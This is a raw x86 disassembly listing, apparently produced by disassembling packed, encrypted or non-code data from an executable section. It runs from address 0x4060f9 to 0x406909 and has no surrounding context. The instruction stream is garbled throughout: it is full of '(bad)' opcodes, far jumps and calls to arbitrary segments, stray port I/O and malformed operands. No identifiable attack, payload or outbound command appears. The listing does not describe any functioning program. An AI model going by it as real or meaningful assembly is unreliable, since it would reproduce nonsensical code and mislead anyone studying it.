  4060f9:	mov    ch,0x78
  4060fb:	dec    esp
  4060fc:	adc    ebx,DWORD PTR [edx+0x44]
  4060ff:	and    bl,BYTE PTR [edi+0x2277f6f8]
  406105:	mov    ch,BYTE PTR [ecx-0xc629273]
  40610b:	rcr    DWORD PTR [esi],1
  40610d:	imul   ecx,DWORD PTR [edx+0xcea9926],0x8b185421
  406117:	sar    DWORD PTR [eax+0x23d981f1],1
  40611d:	(bad)  
  40611e:	jmp    esi
  406120:	cld    
  406121:	fidiv  DWORD PTR [ebx]
  406123:	pushf  
  406124:	call   0xf261:0xee579143
  40612b:	loope  0x4060fc
  40612d:	and    BYTE PTR [ecx-0x7642e1cd],0x6e
  406134:	repz mov bh,0x9e
  406137:	inc    edx
  406138:	jmp    0x4060d5
  40613a:	retf   
  40613b:	loopne 0x406112
  40613d:	mov    ah,0xa9
  40613f:	loopne 0x406160
  406141:	xor    eax,0x45f97ec1
  406146:	test   eax,0xde81f826
  40614b:	clc    
  40614c:	(bad)  
  40614d:	lods   eax,DWORD PTR ds:[esi]
  40614e:	fimul  DWORD PTR [edi+0x1d0f46ab]
  406154:	pop    ds
  406155:	push   ebx
  406156:	pop    ecx
  406157:	jb     0x4060fc
  406159:	lods   eax,DWORD PTR ds:[esi]
  40615a:	lea    ebx,[edx]
  40615c:	dec    esp
  40615d:	or     al,0x68
  40615f:	repz test al,0x75
  406162:	or     cl,ch
  406164:	ss push cs
  406166:	xlat   BYTE PTR ds:[ebx]
  406167:	jo     0x40616b
  406169:	add    ebp,DWORD PTR [ecx+ebp*8-0x4eec6f95]
  406170:	mov    ch,0x15
  406172:	pop    edx
  406173:	xchg   ebx,eax
  406174:	in     al,0xa1
  406176:	loopne 0x4061e7
  406178:	cmp    eax,0x7cd7f5c3
  40617d:	ficom  WORD PTR ds:0xb55b3061
  406183:	ins    DWORD PTR es:[edi],dx
  406184:	std    
  406185:	cli    
  406186:	sbb    BYTE PTR [ebx-0x71ebb671],bl
  40618c:	mov    ecx,0x986a3b47
  406191:	jg     0x40613f
  406193:	pop    ebp
  406194:	xchg   esp,eax
  406195:	call   0xfc32:0xf6a37d32
  40619c:	(bad)  
  40619d:	mov    edx,0xebefced0
  4061a2:	jns    0x4061a8
  4061a4:	neg    DWORD PTR ds:0xa65187e5
  4061aa:	adc    ebp,edi
  4061ac:	fiadd  WORD PTR [eax]
  4061ae:	add    ch,BYTE PTR [esi]
  4061b0:	fistp  DWORD PTR [esi]
  4061b2:	es xchg esi,eax
  4061b4:	stos   DWORD PTR es:[edi],eax
  4061b5:	test   DWORD PTR [eax-0x5f],0xdc286207
  4061bc:	push   ds
  4061bd:	xchg   ebp,eax
  4061be:	neg    DWORD PTR [ebp+0x6c]
  4061c1:	mov    ebx,0x92bd89b6
  4061c6:	fist   WORD PTR [esi]
  4061c8:	cmp    ebp,DWORD PTR [esi]
  4061ca:	xchg   ebp,eax
  4061cb:	popa   
  4061cc:	mov    eax,0xe945b1c4
  4061d1:	sbb    al,0xcf
  4061d3:	sbb    DWORD PTR [eax-0x20896e8],edi
  4061d9:	push   ds
  4061da:	mov    bh,0xfe
  4061dc:	xor    dl,BYTE PTR [ecx-0x54]
  4061df:	inc    ecx
  4061e0:	push   eax
  4061e1:	xor    ebx,DWORD PTR [ecx]
  4061e3:	fst    DWORD PTR [eax+0x9]
  4061e6:	(bad)  
  4061e7:	je     0x40622f
  4061e9:	or     edx,DWORD PTR [edi-0x74]
  4061ec:	pop    edi
  4061ed:	imul   ecx,DWORD PTR [edi+0x687d4fd2],0x44
  4061f4:	jmp    0x62b5050e
  4061f9:	mov    BYTE PTR [edx],dl
  4061fb:	sub    eax,0xafc5a
  406200:	jnp    0x4061ea
  406202:	in     eax,dx
  406203:	xor    BYTE PTR [edi],ch
  406205:	repnz ror DWORD PTR [ebx-0x14bee9a9],0x54
  40620d:	xchg   ecx,eax
  40620e:	adc    ah,BYTE PTR ds:0x70d03957
  406214:	lahf   
  406215:	in     al,dx
  406216:	cli    
  406217:	mov    dl,0xe1
  406219:	mov    eax,DWORD PTR [esi-0x6]
  40621c:	mov    ah,0x8e
  40621e:	repnz arpl WORD PTR [ebx-0x169269ad],ax
  406225:	fcomp  QWORD PTR [edx]
  406227:	stc    
  406228:	jb     0x40623b
  40622a:	cwde   
  40622b:	inc    dx
  40622d:	mov    eax,0xe67bd178
  406232:	sub    DWORD PTR [edx],ebp
  406234:	adc    ah,BYTE PTR [edi+0x2f]
  406237:	mov    esi,0xe3f15268
  40623c:	cmp    eax,0xb362bd72
  406241:	jbe    0x406243
  406243:	into   
  406244:	imul   eax,DWORD PTR [esi],0x14467968
  40624a:	push   0xffffff9c
  40624c:	fdiv   st,st(2)
  40624e:	xor    eax,0x9d79091e
  406253:	and    DWORD PTR [edx+0x6ce96950],edx
  406259:	fsubr  QWORD PTR [eax+0x2c]
  40625c:	xchg   ebp,eax
  40625d:	pop    ds
  40625e:	mov    ?,ecx
  406260:	daa    
  406261:	cmp    edx,DWORD PTR [edi+0x17e3e7ec]
  406267:	dec    esi
  406268:	(bad)  
  406269:	pusha  
  40626a:	mov    ebp,0xa51494cf
  40626f:	pushf  
  406270:	test   DWORD PTR [eax],edx
  406272:	add    edx,DWORD PTR [edi+0x1df78fa0]
  406278:	adc    al,0x8c
  40627a:	neg    BYTE PTR [edi]
  40627c:	test   al,0xeb
  40627e:	push   ebx
  40627f:	jecxz  0x40627e
  406281:	jmp    0x406232
  406283:	add    BYTE PTR [edx+0x2d631eef],ah
  406289:	xchg   edx,eax
  40628a:	sub    DWORD PTR [ebp-0x31ac7f1e],0x77
  406291:	addr16 repnz in al,dx
  406294:	ins    BYTE PTR es:[edi],dx
  406295:	mov    bl,0x63
  406297:	xchg   edi,eax
  406298:	fndisi(8087 only) 
  40629a:	dec    ecx
  40629b:	into   
  40629c:	push   esp
  40629d:	mov    bl,0xe2
  40629f:	mov    ebp,0xe76e37ab
  4062a4:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4062a6:	xor    cl,bl
  4062a8:	mov    eax,ds:0x81f62e34
  4062ad:	xlat   BYTE PTR ds:[ebx]
  4062ae:	push   es
  4062af:	and    BYTE PTR [esi-0x4e],al
  4062b2:	lds    ebp,FWORD PTR [ebx-0xdb3b2fc]
  4062b8:	push   ds
  4062b9:	mov    esi,edi
  4062bb:	sub    DWORD PTR [ebx+ebp*4],ebx
  4062be:	sub    al,BYTE PTR [ebx]
  4062c0:	xor    eax,0x51dfce3e
  4062c5:	call   0x4b10346
  4062ca:	(bad)  
  4062cb:	push   edx
  4062cc:	in     al,dx
  4062cd:	ins    BYTE PTR es:[edi],dx
  4062ce:	arpl   bx,bp
  4062d0:	pop    edi
  4062d1:	inc    ebx
  4062d2:	push   edi
  4062d3:	popa   
  4062d4:	out    0xf8,eax
  4062d6:	inc    esi
  4062d7:	push   0xda921b72
  4062dc:	repz jns 0x40626d
  4062df:	cmp    eax,0xf5f24003
  4062e4:	dec    edx
  4062e5:	xor    BYTE PTR [esi],0xc4
  4062e8:	mov    BYTE PTR [edx-0x67],bl
  4062eb:	inc    ebx
  4062ec:	adc    BYTE PTR [ebx],0xd4
  4062ef:	fdiv   QWORD PTR [edx]
  4062f1:	xchg   edi,eax
  4062f2:	mov    edi,DWORD PTR [ebx]
  4062f4:	fst    QWORD PTR [ebx-0x45]
  4062f7:	inc    ecx
  4062f8:	aas    
  4062f9:	push   ebx
  4062fa:	push   ss
  4062fb:	jp     0x406307
  4062fd:	jne    0x406331
  4062ff:	adc    eax,0xcaac4134
  406304:	and    DWORD PTR [ecx],edi
  406306:	mov    al,0x33
  406308:	cmc    
  406309:	pop    ecx
  40630a:	in     eax,0x30
  40630c:	dec    esi
  40630d:	adc    eax,0x85435f4d
  406312:	dec    edi
  406313:	repz xor edx,DWORD PTR [esi+ecx*4]
  406317:	add    edi,0x64
  40631a:	add    DWORD PTR [edx+0x1f],ebx
  40631d:	jmp    0x5dde4c5c
  406322:	dec    ecx
  406323:	pop    ebp
  406324:	or     eax,0xd0718da7
  406329:	push   cs
  40632a:	fsub   DWORD PTR [ecx-0x71]
  40632d:	sub    al,0x35
  40632f:	outs   dx,BYTE PTR ds:[esi]
  406330:	or     eax,0x16cd1730
  406335:	sbb    DWORD PTR [edi+0x75],0xba3889b4
  40633c:	sub    eax,0x3a3118e2
  406341:	aad    0x2f
  406343:	fcom   QWORD PTR [ecx+0x61]
  406346:	jno    0x4062ed
  406348:	jp     0x406312
  40634a:	mov    gs,WORD PTR [ebx+0x79]
  40634d:	outs   dx,BYTE PTR ds:[si]
  40634f:	ins    DWORD PTR es:[edi],dx
  406350:	sub    al,0x14
  406352:	sar    ch,0x54
  406355:	mov    al,0xfb
  406357:	dec    edx
  406358:	lds    ecx,FWORD PTR [ecx-0x52]
  40635b:	or     cl,BYTE PTR [ebp+0x16eefc4a]
  406361:	icebp  
  406362:	sub    eax,DWORD PTR [ebp+0x6ecbb1eb]
  406368:	push   edx
  406369:	sbb    al,BYTE PTR [ecx+0x7f4e9d46]
  40636f:	shr    BYTE PTR [edx],1
  406371:	(bad)  
  406372:	push   DWORD PTR [ecx-0x272058f3]
  406378:	mov    ebx,0x64de776b
  40637d:	dec    eax
  40637e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40637f:	mov    ebp,0x8591952c
  406384:	dec    ebx
  406385:	fstp   DWORD PTR [ecx-0x3fc971]
  40638b:	push   ebp
  40638c:	xchg   ebx,eax
  40638d:	ret    0x1cbd
  406390:	into   
  406391:	xchg   esp,eax
  406392:	pop    esp
  406393:	shl    BYTE PTR [ecx],cl
  406395:	mov    ch,BYTE PTR ds:0x1d4f61b6
  40639b:	lods   al,BYTE PTR ds:[esi]
  40639c:	mov    ds:0xaced3e0,al
  4063a1:	push   cs
  4063a2:	std    
  4063a3:	pop    eax
  4063a4:	and    bh,BYTE PTR [ebx-0x69]
  4063a7:	sub    al,0x92
  4063a9:	(bad)  
  4063aa:	fld    QWORD PTR [ecx]
  4063ac:	repnz out 0x9f,eax
  4063af:	popf   
  4063b0:	shl    DWORD PTR [ebp-0x5d],1
  4063b3:	test   DWORD PTR [esi],ebp
  4063b5:	stc    
  4063b6:	fisubr WORD PTR [edi+edx*4]
  4063b9:	mov    dl,0x6e
  4063bb:	mov    esi,0x43525f99
  4063c0:	bound  edi,QWORD PTR [eax]
  4063c2:	sbb    BYTE PTR [ebp+0x3b],bh
  4063c5:	sbb    eax,0xe22724
  4063ca:	movzx  ebp,BYTE PTR [ebx-0x48a39398]
  4063d1:	fadd   st(0),st
  4063d3:	sub    eax,0xd75ed8e6
  4063d8:	xor    al,0x52
  4063da:	xor    eax,0x4da5bc25
  4063df:	arpl   WORD PTR [edi+edi*8],bx
  4063e2:	cdq    
  4063e3:	ss inc esp
  4063e5:	data16 aaa 
  4063e7:	mov    ds,WORD PTR [edx-0x395d6644]
  4063ed:	bound  ecx,QWORD PTR [ebx+edi*4]
  4063f0:	xchg   edi,eax
  4063f1:	ds loop 0x4063dd
  4063f4:	pop    ebp
  4063f5:	mov    bh,0x4c
  4063f7:	inc    ebx
  4063f9:	cmp    al,0x2d
  4063fb:	jb     0x4063cc
  4063fd:	mov    BYTE PTR [edi+0x3fa285f4],dh
  406403:	jnp    0x40638f
  406405:	outs   dx,BYTE PTR ds:[esi]
  406406:	outs   dx,BYTE PTR ds:[esi]
  406407:	push   esp
  406408:	inc    edx
  406409:	test   BYTE PTR [ecx-0x4f82c74f],bh
  40640f:	pop    ss
  406410:	xchg   edx,eax
  406411:	mov    ebx,0x915ab554
  406416:	mov    BYTE PTR [eax],bl
  406418:	and    eax,0xffffff81
  40641b:	js     0x406449
  40641d:	in     eax,0xdf
  40641f:	cli    
  406420:	add    al,0xc3
  406422:	add    al,0xa3
  406424:	jecxz  0x406464
  406426:	jecxz  0x40640e
  406428:	push   ss
  406429:	lods   eax,DWORD PTR ds:[esi]
  40642a:	cs pop ds
  40642c:	dec    ebx
  40642d:	cmp    al,0xd2
  40642f:	mov    al,ds:0x91ddd59f
  406434:	xchg   di,ax
  406436:	test   BYTE PTR [edi+0x22],0x8
  40643a:	jp     0x406405
  40643c:	jo     0x40647a
  40643e:	jp     0x40644a
  406440:	fidivr DWORD PTR [edi]
  406442:	repnz xchg edi,eax
  406444:	xchg   ebx,eax
  406445:	xchg   dh,dl
  406447:	mov    ebp,0xb0ca77d0
  40644c:	iret   
  40644d:	sti    
  40644e:	enter  0x752,0x1a
  406452:	test   eax,0x6d8fb354
  406457:	test   al,0x61
  406459:	add    ebx,eax
  40645b:	pop    ebx
  40645c:	push   edi
  40645d:	pop    esp
  40645e:	jne    0x40640d
  406460:	(bad)  
  406461:	xor    BYTE PTR [edx-0x2abcfccd],bl
  406467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406468:	mov    edi,0x8b5b9b28
  40646d:	sub    esi,ebx
  40646f:	ret    
  406470:	mov    ebp,0x10ae3e21
  406475:	sub    BYTE PTR [edx],cl
  406477:	inc    ecx
  406478:	and    eax,0xdf2e0050
  40647d:	test   BYTE PTR [edi],dl
  40647f:	test   ah,ah
  406481:	lds    esp,FWORD PTR [edx+0x47]
  406484:	pop    es
  406485:	push   cs
  406486:	(bad)  
  406487:	xor    ah,BYTE PTR [eax]
  406489:	pop    es
  40648a:	mov    ds:0x7f8e23c1,al
  40648f:	inc    ebx
  406490:	leave  
  406491:	push   es
  406492:	xchg   esp,eax
  406493:	sbb    esp,esi
  406495:	cld    
  406496:	outs   dx,DWORD PTR ds:[esi]
  406497:	int3   
  406498:	pop    es
  406499:	jl     0x406455
  40649b:	pop    esp
  40649c:	jl     0x40645e
  40649e:	mov    BYTE PTR [ebx],dh
  4064a0:	fcmovb st,st(3)
  4064a2:	add    al,0x95
  4064a4:	retf   0x6cb9
  4064a7:	sub    DWORD PTR [edx+edx*8+0x52f17082],edx
  4064ae:	inc    esp
  4064af:	sahf   
  4064b0:	push   edx
  4064b1:	inc    ebx
  4064b2:	imul   ebp,DWORD PTR [edi-0x1d],0x45
  4064b6:	jl     0x406450
  4064b8:	(bad)  
  4064b9:	int    0x6
  4064bb:	or     eax,0xed0bf57
  4064c0:	pushf  
  4064c1:	add    eax,DWORD PTR [ebx-0x20]
  4064c4:	inc    esi
  4064c5:	sti    
  4064c6:	icebp  
  4064c7:	pusha  
  4064c8:	mov    DWORD PTR [ebx],edi
  4064ca:	in     al,dx
  4064cb:	xchg   edi,eax
  4064cc:	scas   al,BYTE PTR es:[edi]
  4064cd:	(bad)  
  4064ce:	test   ch,bl
  4064d0:	lods   eax,DWORD PTR ds:[esi]
  4064d1:	mov    dl,0x38
  4064d3:	retf   
  4064d4:	cmp    dh,BYTE PTR [esi+0x242c35f0]
  4064da:	nop
  4064db:	or     dh,BYTE PTR ds:0xfde64b00
  4064e1:	mov    esi,0xc796dac
  4064e6:	pop    ds
  4064e7:	push   ebx
  4064e8:	hlt    
  4064e9:	packsswb mm4,QWORD PTR ds:0xfdbb3c67
  4064f0:	dec    ebx
  4064f1:	adc    BYTE PTR [esi+0x55],al
  4064f4:	mov    ecx,0xdca07612
  4064f9:	push   esi
  4064fa:	and    DWORD PTR [ecx-0x51aebfce],edi
  406500:	dec    esp
  406501:	hlt    
  406502:	mov    ah,BYTE PTR [ebp+0xd377396]
  406508:	fsub   DWORD PTR [edi-0x7b]
  40650b:	push   edx
  40650c:	mov    ds:0xc5d4c4ad,al
  406511:	and    ebx,DWORD PTR [eax]
  406513:	inc    edx
  406514:	adc    eax,0xcbae9d4d
  406519:	mov    ss,WORD PTR [ecx+0x5ce243eb]
  40651f:	or     DWORD PTR [esi+0x58],ecx
  406522:	rol    DWORD PTR [ebx-0x1b],1
  406525:	jne    0x40659d
  406527:	sbb    DWORD PTR [edx-0x72],0x1bf1fc3a
  40652e:	hlt    
  40652f:	adc    bh,BYTE PTR [eax+0x6a]
  406532:	out    dx,eax
  406533:	dec    si
  406535:	mov    dl,0x2c
  406537:	jo     0x406573
  406539:	xchg   esi,eax
  40653a:	aas    
  40653b:	shl    DWORD PTR [ebp+0x2d],1
  40653e:	jnp    0x406561
  406540:	ret    0xfcc8
  406543:	test   eax,0x5ef5b1c2
  406548:	pop    ebp
  406549:	je     0x406596
  40654b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40654c:	cwde   
  40654d:	gs pop ebp
  40654f:	dec    ebx
  406550:	rcl    eax,1
  406552:	add    ah,BYTE PTR [eax]
  406554:	(bad)  
  406555:	sti    
  406556:	icebp  
  406557:	xor    al,0x79
  406559:	mov    bh,ah
  40655b:	in     al,0x98
  40655d:	jl     0x4065a9
  40655f:	(bad)  
  406560:	test   eax,0xacd81913
  406565:	ss stc 
  406567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406568:	jmp    0xc1853df7
  40656d:	loope  0x4065ab
  40656f:	aas    
  406570:	add    al,0xfc
  406572:	hlt    
  406573:	scas   eax,DWORD PTR es:[edi]
  406574:	shr    dh,cl
  406576:	push   edx
  406577:	jmp    0xc601:0x888d1436
  40657e:	addr16 push ss
  406580:	aaa    
  406581:	(bad)  
  406582:	inc    eax
  406583:	scas   eax,DWORD PTR es:[edi]
  406584:	daa    
  406585:	in     eax,dx
  406586:	bound  edx,QWORD PTR [edi]
  406588:	ror    dl,cl
  40658a:	jo     0x4065e3
  40658c:	and    eax,0xbea0421d
  406591:	jmp    0x84d083e6
  406596:	iret   
  406597:	fnstcw WORD PTR [ecx+0x7c30a841]
  40659d:	outs   dx,DWORD PTR ds:[esi]
  40659e:	dec    eax
  40659f:	ror    bl,0xef
  4065a2:	bound  eax,QWORD PTR [edx-0x3]
  4065a5:	ret    
  4065a6:	fldz   
  4065a8:	inc    edi
  4065a9:	pop    edi
  4065aa:	or     ebx,0x17425a56
  4065b0:	ret    
  4065b1:	addr16 jmp 0x80db9bac
  4065b7:	cmp    esi,DWORD PTR [ebx+0x22bce7bd]
  4065bd:	or     DWORD PTR [eax],0x3e
  4065c0:	enter  0x976f,0x70
  4065c4:	(bad)  
  4065c5:	imul   ecx,DWORD PTR [ebx],0xe954bd31
  4065cb:	hlt    
  4065cc:	jo     0x406586
  4065ce:	and    al,0xcd
  4065d0:	and    BYTE PTR [edi+eiz*8+0x7d],0xd8
  4065d5:	dec    esp
  4065d6:	loopne 0x40664f
  4065d8:	call   0x50fe340a
  4065dd:	in     al,dx
  4065de:	mov    al,0xff
  4065e0:	in     al,dx
  4065e1:	jmp    0x4c2:0xec27cc88
  4065e8:	jae    0x40664e
  4065ea:	xchg   DWORD PTR [esi+0x79d16849],ebx
  4065f0:	shr    dl,1
  4065f2:	rep stos DWORD PTR es:[edi],eax
  4065f4:	xor    eax,0x6a2ae591
  4065f9:	addr16 jl 0x406656
  4065fc:	icebp  
  4065fd:	in     al,0x43
  4065ff:	or     eax,0xb0c3c077
  406604:	ins    DWORD PTR es:[edi],dx
  406605:	mov    bl,BYTE PTR [edi-0x75]
  406608:	jno    0x40666f
  40660a:	ins    DWORD PTR es:[edi],dx
  40660b:	dec    ebp
  40660c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660d:	fnstcw WORD PTR [ecx+0x5f834b53]
  406613:	arpl   WORD PTR [esi],cx
  406615:	gs (bad) 
  406617:	or     dl,bh
  406619:	ds int3 
  40661b:	shl    BYTE PTR [ecx-0x585961cc],1
  406621:	push   ds
  406622:	mov    ecx,0xfb12b262
  406627:	pushf  
  406628:	into   
  406629:	mov    esp,ecx
  40662b:	push   edi
  40662c:	mul    ebp
  40662e:	pop    ecx
  40662f:	or     edi,DWORD PTR [ebx-0x3e]
  406632:	adc    al,0xb1
  406634:	repnz push esi
  406636:	sub    eax,0x5fd68916
  40663b:	jl     0x4065c6
  40663d:	sbb    bh,al
  40663f:	push   eax
  406640:	push   edx
  406641:	adc    BYTE PTR [ecx+0x466e0c80],0xa6
  406648:	jmp    0x4065ff
  40664a:	or     al,0xe0
  40664c:	xchg   edx,eax
  40664d:	jle    0x406665
  40664f:	cmp    DWORD PTR [edx],esi
  406651:	in     eax,dx
  406652:	push   esi
  406653:	jecxz  0x4065f7
  406655:	adc    BYTE PTR [ebp-0x13dd096a],cl
  40665b:	xor    cl,dh
  40665d:	mov    esp,0xc30b312d
  406662:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406663:	mov    ah,bl
  406665:	(bad)  
  406666:	adc    ebp,edi
  406668:	mov    ah,0x6d
  40666a:	inc    edi
  40666b:	add    bl,0xa3
  40666e:	and    DWORD PTR [esi-0x1c33ec6a],ecx
  406674:	xchg   ebx,eax
  406675:	ins    DWORD PTR es:[edi],dx
  406676:	mov    ebx,0x5909035d
  40667b:	fmul   st,st(7)
  40667d:	xor    dh,BYTE PTR [ebx-0x53acc4cb]
  406683:	cmp    al,0xdb
  406685:	popa   
  406686:	pop    ss
  406687:	add    al,0xab
  406689:	aaa    
  40668a:	and    DWORD PTR [ebp-0x24f5f565],ebp
  406690:	fisubr DWORD PTR [esi+0x26813f99]
  406696:	fsub   QWORD PTR [eax]
  406698:	jmp    0x4066d4
  40669a:	pusha  
  40669b:	fwait
  40669c:	ds dec edx
  40669e:	adc    eax,DWORD PTR [ebx+0x7478a1be]
  4066a4:	test   DWORD PTR [edx+eiz*2-0x32],ebx
  4066a8:	stos   DWORD PTR es:[edi],eax
  4066a9:	mov    ebx,0x782da868
  4066ae:	sub    BYTE PTR [edx-0x5850830c],cl
  4066b4:	(bad)
  4066b7:	fs test eax,0x2119cb10
  4066bd:	leave  
  4066be:	test   ecx,esp
  4066c0:	jns    0x4066b0
  4066c2:	or     bh,dl
  4066c4:	mov    BYTE PTR [edi],bh
  4066c6:	inc    edx
  4066c7:	addr16 xchg ebp,eax
  4066c9:	int3   
  4066ca:	scas   al,BYTE PTR es:[edi]
  4066cb:	inc    edx
  4066cc:	pushf  
  4066cd:	jno    0x4066cd
  4066cf:	es dec edx
  4066d1:	leave  
  4066d2:	shl    edx,0x25
  4066d5:	dec    esp
  4066d6:	test   eax,0xddf13305
  4066db:	lods   al,BYTE PTR ds:[esi]
  4066dc:	gs inc ebx
  4066de:	dec    eax
  4066df:	sbb    cl,ah
  4066e1:	push   ds
  4066e2:	xchg   ebx,eax
  4066e3:	pinsrw mm1,WORD PTR [ebx],0x7f
  4066e7:	push   ss
  4066e8:	mov    ecx,0x2f290a12
  4066ed:	clc    
  4066ee:	inc    ecx
  4066ef:	mov    ah,0xed
  4066f1:	and    eax,0x57d2dac3
  4066f6:	imul   esi,ebp,0x65
  4066f9:	mov    edx,0xb4c81241
  4066fe:	pop    esp
  4066ff:	loopne 0x406768
  406701:	lock dec ebp
  406703:	and    DWORD PTR [edx],ecx
  406705:	imul   esp,DWORD PTR [ecx-0x2f],0xffffff91
  406709:	add    ch,BYTE PTR [ecx-0x547cc2b1]
  40670f:	dec    edi
  406710:	ret    
  406711:	add    BYTE PTR [esi+esi*2],dl
  406714:	into   
  406715:	push   0xf15da3b1
  40671a:	frstpm(287 only) 
  40671c:	or     ch,cl
  40671e:	jbe    0x40678a
  406720:	cmp    bh,BYTE PTR [eax-0x27ad47ac]
  406726:	paddusb mm5,mm1
  406729:	sub    ebp,0xffffffce
  40672c:	cmc    
  40672d:	in     eax,dx
  40672e:	push   es
  40672f:	fadd   QWORD PTR [edi]
  406731:	inc    eax
  406732:	sub    ecx,DWORD PTR [eax+0x8]
  406735:	sub    BYTE PTR [esp+edi*4-0x7d],ah
  406739:	test   BYTE PTR [eax+0xe],0xd6
  40673d:	or     eax,0xf5882337
  406742:	sub    ah,bl
  406744:	ret    0x4595
  406747:	add    BYTE PTR [esi+0x1a],ch
  40674a:	inc    esi
  40674b:	sbb    BYTE PTR [esi+0x5080f1e1],0x8d
  406752:	xlat   BYTE PTR ds:[ebx]
  406753:	add    eax,0xe7d02e77
  406758:	repz jne 0x406743
  40675b:	fsubr  st(6),st
  40675d:	jmp    0xde3701d4
  406762:	in     eax,dx
  406763:	jno    0x4067d5
  406765:	jo     0x4066f2
  406767:	loop   0x4067b0
  406769:	push   esi
  40676a:	inc    edx
  40676b:	aad    0x49
  40676d:	leave  
  40676e:	iret   
  40676f:	(bad)  
  406771:	cdq    
  406772:	inc    ebx
  406773:	inc    ebx
  406774:	sub    ebx,DWORD PTR [edi+eax*2]
  406777:	cli    
  406778:	sahf   
  406779:	pop    ss
  40677a:	(bad)  
  40677b:	into   
  40677c:	dec    ebx
  40677d:	pop    ss
  40677e:	and    edi,DWORD PTR [ecx]
  406780:	push   es
  406781:	call   0x2144085e
  406786:	(bad)  
  406787:	and    DWORD PTR [edx+0x35e0c5ac],ebp
  40678d:	and    eax,0xd7845b85
  406792:	mov    ds:0x50a3fc89,eax
  406797:	xchg   ebx,eax
  406798:	xor    BYTE PTR [esi+0x9fc9859],cl
  40679e:	add    eax,0x227f0930
  4067a3:	addr16 cmp eax,0x390868f6
  4067a9:	and    ebp,DWORD PTR [ebx+0x33]
  4067ac:	add    DWORD PTR [ecx],ecx
  4067ae:	fnsave ds:0x3584d0d9
  4067b4:	push   edx
  4067b5:	mov    esp,0x738cdeee
  4067ba:	cmp    eax,DWORD PTR [ecx-0x6e]
  4067bd:	cdq    
  4067be:	ret    0x675d
  4067c1:	in     eax,dx
  4067c2:	inc    ebx
  4067c3:	je     0x4067eb
  4067c5:	shr    DWORD PTR [eax+0x3717a70a],1
  4067cb:	cmp    DWORD PTR [ebp-0x19],edi
  4067ce:	or     esi,esi
  4067d0:	gs sub eax,0x57987ff4
  4067d6:	mov    bl,0x66
  4067d8:	int    0xf3
  4067da:	fimul  WORD PTR [ecx-0x7e]
  4067dd:	inc    edx
  4067de:	or     eax,0x69945ed9
  4067e3:	stc    
  4067e4:	mov    dh,0x3d
  4067e6:	mov    esp,0xb33f9ad
  4067eb:	sub    DWORD PTR [eax-0x24a784bb],esi
  4067f1:	in     al,0xb0
  4067f3:	not    ah
  4067f5:	imul   esp,DWORD PTR [eax-0x4a64a1ea],0x34
  4067fc:	mov    edi,0xc5f7eef9
  406801:	xchg   edx,eax
  406802:	push   edx
  406803:	pop    ebp
  406804:	cmp    DWORD PTR [edi-0x7ac5b93],ecx
  40680a:	push   edi
  40680b:	mov    al,0x48
  40680d:	pop    esp
  40680e:	or     ebx,esi
  406810:	popa   
  406811:	dec    ebp
  406812:	pusha  
  406813:	test   eax,0xecb12454
  406818:	jns    0x406877
  40681a:	cmp    cl,0x48
  40681d:	mov    bl,BYTE PTR [ecx-0x308511df]
  406823:	fisubr DWORD PTR [ecx-0x30]
  406826:	lods   eax,DWORD PTR ds:[esi]
  406827:	pop    ds
  406828:	adc    esp,DWORD PTR [edx+0x6753a9bd]
  40682e:	sbb    BYTE PTR [ebp+0x53c25627],0xee
  406835:	ror    edi,cl
  406837:	ds (bad) 
  40683b:	cmp    edx,esp
  40683d:	popf   
  40683e:	add    bl,BYTE PTR [ebx+0x48b8f567]
  406844:	repz mov WORD PTR [esi+0x10],?
  406848:	jae    0x40689d
  40684a:	dec    edi
  40684b:	call   0xca13:0xe732094e
  406852:	fist   DWORD PTR ds:0xd82cd7f
  406858:	shr    edx,cl
  40685a:	mov    dl,0x1b
  40685c:	in     al,dx
  40685d:	in     eax,dx
  40685e:	add    eax,0x588dca6e
  406863:	jl     0x406898
  406865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406866:	inc    esi
  406867:	leave  
  406868:	(bad)  
  406869:	push   cs
  40686a:	add    al,0x9c
  40686c:	ja     0x406850
  40686e:	repnz push edi
  406870:	dec    ebx
  406871:	add    eax,0x4ddf045c
  406876:	push   eax
  406877:	sbb    eax,0x6d2f4d88
  40687c:	cmp    eax,0x930c777c
  406881:	xor    dh,BYTE PTR [esi]
  406883:	loopne 0x4068d3
  406885:	sahf   
  406886:	xor    BYTE PTR [edx],dh
  406888:	and    ecx,DWORD PTR [edx-0x58]
  40688b:	jmp    0x40684a
  40688d:	fxch   st(1)
  40688f:	mov    ecx,0xf2c48893
  406894:	xchg   esp,eax
  406895:	fyl2x  
  406897:	sbb    edx,DWORD PTR [ebx+0x26cb9382]
  40689d:	out    0x3c,al
  40689f:	inc    BYTE PTR [edi-0x52]
  4068a2:	inc    esp
  4068a3:	enter  0x1c9b,0x85
  4068a7:	jge    0x4068c2
  4068a9:	ret    0x5451
  4068ac:	sub    BYTE PTR [ecx+ebp*1],cl
  4068af:	push   0xe158dd1e
  4068b4:	push   edi
  4068b5:	outs   dx,BYTE PTR ds:[esi]
  4068b6:	loop   0x40690e
  4068b8:	das    
  4068b9:	rcr    ch,1
  4068bb:	test   DWORD PTR [edi],edi
  4068bd:	mov    edi,0x57186ed0
  4068c2:	popf   
  4068c3:	push   ebp
  4068c4:	inc    edx
  4068c5:	jmp    0x40688e
  4068c7:	scas   al,BYTE PTR es:[edi]
  4068c8:	nop
  4068c9:	call   0x6fa3:0x6a9f5c44
  4068d0:	addr16 cwde 
  4068d2:	sahf   
  4068d3:	lods   eax,DWORD PTR ds:[esi]
  4068d4:	loope  0x4068f0
  4068d6:	fldcw  WORD PTR ds:0xb09ef934
  4068dc:	mov    edx,0x6a8ca5e6
  4068e1:	jnp    0x4068c2
  4068e3:	pushf  
  4068e4:	mov    edx,eax
  4068e6:	sub    edx,DWORD PTR [edx+0x3830c825]
  4068ec:	xor    BYTE PTR [esp+edx*2+0x18],bh
  4068f0:	jmp    0xaa7f:0x30cb432a
  4068f7:	mov    eax,ds:0x1abfa5e5
  4068fc:	sub    eax,0xd1e03ee2
  406901:	inc    ecx
  406902:	jmp    0x406923
  406904:	jo     0x406985
  406906:	into   
  406907:	neg    cl
  406909:	stos   BYTE PTR es:[edi],al
